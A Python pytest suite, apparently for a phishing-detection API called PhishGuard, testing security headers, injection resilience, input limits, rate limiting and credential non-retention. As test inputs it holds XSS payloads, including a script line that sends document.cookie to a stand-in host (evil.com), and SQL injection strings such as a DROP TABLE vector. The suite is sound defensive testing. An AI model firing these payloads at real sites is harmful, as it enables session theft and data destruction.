"""
PhishGuard Security & Resilience QA Test Suite
Validates:
1. HTTP Security Response Headers (OWASP recommendations)
2. Resistance against Cross-Site Scripting (XSS) payloads
3. Resistance against SQL Injection (SQLi) attacks
4. Input validation boundaries & oversized payload rejection
5. Robustness against malformed protocols and ports
6. In-Memory Client Rate Limiter (HTTP 429 Too Many Requests)
7. Non-retention of sensitive credentials and OTP tokens
"""

import pytest
import time
from fastapi.testclient import TestClient
from app.backend.main import app, _client_request_history, _rate_limit_lock
import app.backend.database as db


@pytest.fixture
def client():
    # Clear rate limit memory before tests
    with _rate_limit_lock:
        _client_request_history.clear()
    return TestClient(app)


def test_security_headers_present(client):
    """Verifies that OWASP recommended security headers are attached to API responses."""
    res = client.get("/api/health")
    assert res.status_code == 200

    headers = res.headers
    assert headers.get("X-Content-Type-Options") == "nosniff"
    assert headers.get("X-Frame-Options") == "DENY"
    assert headers.get("X-XSS-Protection") == "1; mode=block"
    assert headers.get("Referrer-Policy") == "strict-origin-when-cross-origin"
    assert "Content-Security-Policy" in headers
    assert "default-src 'self'" in headers["Content-Security-Policy"]


def test_xss_payload_safety_in_url_and_message(client):
    """Verifies that hostile XSS script vectors in URLs and messages are handled safely without unhandled crashes."""
    xss_payloads = [
        "<script>alert('pwned')</script>",
        "javascript:alert(document.cookie)",
        "http://example.com/<img src=x onerror=alert(1)>",
        "http://legit.com/search?q=<svg onload=alert(1)>"
    ]

    for payload in xss_payloads:
        res = client.post("/api/scan-url", json={"url": payload, "save_to_history": False})
        assert res.status_code in [200, 422]
        if res.status_code == 200:
            data = res.json()
            assert "risk_score" in data
            assert data["status"] in ["SAFE", "SUSPICIOUS", "PHISHING"]

    # Test in message scanner
    msg_xss = "Hello, click <script>fetch('http://evil.com?c='+document.cookie)</script> to claim reward"
    res_msg = client.post("/api/scan-message", json={"message": msg_xss, "save_to_history": False})
    assert res_msg.status_code == 200
    assert "risk_score" in res_msg.json()


def test_sqli_resilience_in_history_and_filters(client):
    """Verifies parameterized query protection against SQL injection attempts in search, filter, and delete."""
    sqli_vectors = [
        "' OR '1'='1",
        "1; DROP TABLE scans; --",
        "' UNION SELECT 1, 'admin', 'pass', 100, 1.0, '[]', '', '2026-01-01' --",
        "' OR 1=1 --"
    ]

    for vector in sqli_vectors:
        # 1. In search query
        res = client.get(f"/api/history?search={vector}")
        assert res.status_code == 200
        assert "scans" in res.json()

        # 2. In status filter
        res_filter = client.get(f"/api/history?status_filter={vector}")
        assert res_filter.status_code == 200

    # Ensure scans table still intact and accessible
    res_verify = client.get("/api/statistics")
    assert res_verify.status_code == 200
    assert "total_scans" in res_verify.json()


def test_oversized_payload_rejection(client):
    """Asserts that requests exceeding maximum length boundaries are rejected with HTTP 422 Unprocessable Entity."""
    oversized_url = "http://example.com/" + ("a" * 4500)
    res = client.post("/api/scan-url", json={"url": oversized_url})
    assert res.status_code == 422

    oversized_msg = "A" * 55000
    res_msg = client.post("/api/scan-message", json={"message": oversized_msg})
    assert res_msg.status_code == 422


def test_malformed_url_and_port_handling(client):
    """Tests that unusual, malformed protocols, out-of-range ports, and edge-case URLs do not crash the engine."""
    malformed_cases = [
        "http://",
        "https://",
        "ftp://malicious-file-server.net/trojan.exe",
        "http://example.com:999999/test",  # Invalid port out of range
        "http://example.com:abc/test",     # Non-numeric port
        "http://[:::1]/test",              # Edge IPv6
        "http://user:password@domain.com/path",
        "///triple-slash-bad-format"
    ]

    for case in malformed_cases:
        res = client.post("/api/scan-url", json={"url": case, "save_to_history": False})
        # Should return either structured result (200) or clean 422/400 validation error, never 500 crash
        assert res.status_code in [200, 400, 422], f"Failed on case: {case}"


def test_rate_limiting_enforcement(client):
    """Verifies that exceeding the client rate limit returns HTTP 429 Too Many Requests."""
    # Temporarily fill client history to exceed limit
    test_ip = "testclient"
    with _rate_limit_lock:
        now = time.time()
        _client_request_history[test_ip] = [now] * 125

    # Attempt request
    res = client.post("/api/scan-url", json={"url": "https://example.com", "save_to_history": False})
    assert res.status_code == 429
    assert "Retry-After" in res.headers
    assert "Rate limit exceeded" in res.json()["detail"]

    # Clear rate limit memory
    with _rate_limit_lock:
        _client_request_history.clear()


def test_privacy_non_retention_of_sensitive_data(client):
    """Verifies that passwords and OTP tokens in messages are not stored in raw plaintext tables or exposed."""
    sensitive_msg = "Your Chase one-time verification OTP passcode is 849204. Do not disclose your password SecretP@ssword123 to anyone."
    res = client.post("/api/scan-message", json={"message": sensitive_msg, "save_to_history": True})
    assert res.status_code == 200
    data = res.json()

    # Risk should flag OTP / credential pattern
    assert data["status"] in ["SUSPICIOUS", "PHISHING"]
    assert any("OTP" in cat or "Credential" in cat for cat in data.get("flagged_categories", []))

    # Retrieve from history and verify that raw passwords are not inappropriately exposed
    hist = client.get("/api/history?limit=1").json()
    assert len(hist["scans"]) > 0
